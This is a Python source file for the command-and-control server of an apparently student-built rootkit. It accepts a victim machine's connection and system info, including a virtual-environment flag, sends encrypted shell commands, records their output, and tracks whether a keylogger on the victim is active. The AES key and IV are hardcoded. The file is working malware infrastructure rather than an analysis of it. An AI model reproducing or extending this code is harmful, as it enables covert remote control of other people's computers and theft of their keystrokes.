from utils.server.CryptoHandler import CryptoHandler
from utils.server.AESNetworkHandler import AESNetworkHandler
import socket
import threading
import queue
import errno
import json
from typing import Optional

class Request:
    def __init__(self, message: str, add_to_history: bool):
        self.message = message
        self.add_to_history = add_to_history
        self.response: Optional[str] = None
        self.event = threading.Event()

class TCPServer:
    def __init__(self, host: str = '0.0.0.0', port: int = 12345, crypto=None):
        self._host = host
        self._port = port
        self._crypto = crypto or CryptoHandler(
            key=b'1234567890abcdef',
            iv=b'abcdef1234567890'
        )
        self._network_handler = AESNetworkHandler(self._crypto)

        self._server_socket: Optional[socket.socket] = None
        self._client_socket: Optional[socket.socket] = None
        self._client_ip: Optional[str] = None
        self._client_sysinfo: Optional[dict] = {}

        self._ip_lock = threading.Lock()
        self._running = False
        self._authenticated = False
        self._command_history = []
        self._klg_on = False
        
        self._send_queue: queue.Queue[Request] = queue.Queue()
        self._recv_queue = queue.Queue()
        self._server_thread = None

    def start(self) -> None:
        self._running = True
        self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_socket.bind((self._host, self._port))
        self._server_socket.listen(1)

        print(f"[SERVER] Listening on {self._host}:{self._port}")
        self._server_thread = threading.Thread(target=self._accept_client_loop, daemon=True)
        self._server_thread.start()

    def stop(self) -> None:
        self._running = False
        if self._server_socket:
            self._server_socket.close()
        with self._ip_lock:
            self._client_ip = None
            self._authenticated = False
        print("[SERVER] Stopped cleanly.")

    def send_to_client(self, message: str) -> Optional[str]:
        req = Request(message, add_to_history=False)
        self._send_queue.put(req)
        req.event.wait(timeout=10)
        return req.response

    def send_to_client_with_history(self, message: str) -> Optional[str]:
        req = Request(message, add_to_history=True)
        self._send_queue.put(req)
        req.event.wait(timeout=10)
        return req.response

    def receive_from_client(self) -> Optional[str]:
        try:
            return self._recv_queue.get_nowait()
        except queue.Empty:
            return None

    def get_client_ip(self) -> Optional[str]:
        with self._ip_lock:
            return self._client_ip

    def get_listening_port(self) -> int:
        if self._server_socket:
            return self._server_socket.getsockname()[1]
        return 0

    def get_command_history(self) -> list:
        return self._command_history

    def get_client_sysinfo(self) -> Optional[dict]:
        with self._ip_lock:
            return self._client_sysinfo if self._client_sysinfo else None

    def is_authenticated(self) -> bool:
        return self._authenticated

    def is_running(self) -> bool:
        return self._running

    def is_client_connected(self) -> bool:
        with self._ip_lock:
            return self._client_ip is not None

    def is_klg_on(self) -> bool:
        return self._klg_on

    def _is_socket_closed(self, sock: socket.socket) -> bool:
        try:
            data = sock.recv(1, socket.MSG_PEEK)
            if data == b'':
                return True
        except socket.error as e:
            if e.errno in [errno.ECONNRESET, errno.EBADF, errno.ENOTCONN]:
                return True
            elif e.errno in [errno.EWOULDBLOCK, errno.EAGAIN]:
                return False
        return False

    def _accept_client_loop(self) -> None:
        while self._running:
            try:
                print("[SERVER] Waiting for connection...")
                self._client_socket, client_addr = self._server_socket.accept()
                with self._ip_lock:
                    self._client_ip = client_addr[0]
                print(f"[CONNECTED] Client IP: {self._client_ip}")

                # When connected, client send its sysinfo
                get_sysinfo = self._network_handler.receive(self._client_socket)
                parsed_sysinfo = json.loads(get_sysinfo)
                self._client_sysinfo = parsed_sysinfo
                # search for key "virtual_env" and transform it to a boolean
                if "virtual_env" in self._client_sysinfo:
                    self._client_sysinfo["virtual_env"] = bool(self._client_sysinfo["virtual_env"])

                print(f"[SYSINFO] Client sysinfo: {self._client_sysinfo}")

                self._handle_client()

                self._cleanup_after_disconnect()
            except Exception as e:
                print(f"[MAIN LOOP ERROR] {e}")

    def _handle_client(self) -> None:
        try:
            # Ajouter un timeout à la socket pour éviter les blocages longs
            self._client_socket.settimeout(2.0)

            while self._running:
                # Vérifie si le client s'est déconnecté
                if self._client_socket is None or self._is_socket_closed(self._client_socket):
                    print("[SOCKET] Client disconnected.")
                    break

                # Récupère la requête à envoyer, ou passe si la file est vide
                try:
                    request: Request = self._send_queue.get(timeout=1)
                except queue.Empty:
                    continue

                if request is None:
                    break

                # Historique de commande
                if request.add_to_history:
                    self._command_history.append({"command": request.message, "stdout": "", "stderr": ""})

                # Envoi de la commande chiffrée
                success = self._network_handler.send(self._client_socket, request.message)
                if not success:
                    print("[ERROR] Failed to send message.")
                    break

                print(f"[SENT] {request.message}")

                # Réception de la réponse chiffrée
                response = self._network_handler.receive(self._client_socket)
                if response is False:
                    print("[ERROR] Failed to receive response.")
                    break

                print(f"[RECEIVED] {response}")

                # File de réponses + analyse
                self._recv_queue.put(response)
                self._check_rootkit_command(response)
                self._update_command_history(response)

                # Débloque le thread demandeur
                request.response = response
                request.event.set()

        except socket.timeout:
            print("[TIMEOUT] Socket timed out. Exiting client handler.")
        except Exception as e:
            print(f"[HANDLE CLIENT ERROR] {e}")
        finally:
            if self._client_socket:
                self._client_socket.close()


    def _check_rootkit_command(self, message: str) -> None:
        message = message.strip()
        if message == "User authenticated.":
            self._authenticated = True
            print("[AUTHENTICATION] Server authenticated successfully.")
        elif message == "User successfully disconnected.":
            self._authenticated = False
            print("[AUTHENTICATION] User disconnected.")

        elif message == "keylogger activated":
            self._klg_on = True
            print("[KLG] Keylogger activated.")
        elif message == "keylogger desactivated":
            self._klg_on = False
            print("[KLG] Keylogger desactivated.")        

    def _update_command_history(self, message: str) -> None:
        stdout, stderr, termination_code = self._extract_outputs(message)

        for entry in reversed(self._command_history):
            if not entry["stdout"] and not entry["stderr"]:
                entry["stdout"] = stdout
                entry["stderr"] = stderr
                if termination_code:
                    entry["termination_code"] = termination_code
                break

    def _extract_outputs(self, message: str):
        if all(k in message for k in ["stdout:\n", "stderr:\n", "Terminated with code"]):
            stdout = message.split("stdout:\n")[-1].split("stderr:\n")[0].strip()
            stderr = message.split("stderr:\n")[-1].split("Terminated with code")[0].strip()
            termination_code = ''.join(filter(str.isdigit, message.split("Terminated with code")[-1]))
        else:
            stdout, stderr, termination_code = message, "", ""
        return stdout, stderr, termination_code

    def _cleanup_after_disconnect(self) -> None:
        print("[SERVER] Client disconnected.")
        with self._ip_lock:
            self._client_ip = None
        self._client_socket = None
        self._authenticated = False
        self._command_history.clear()
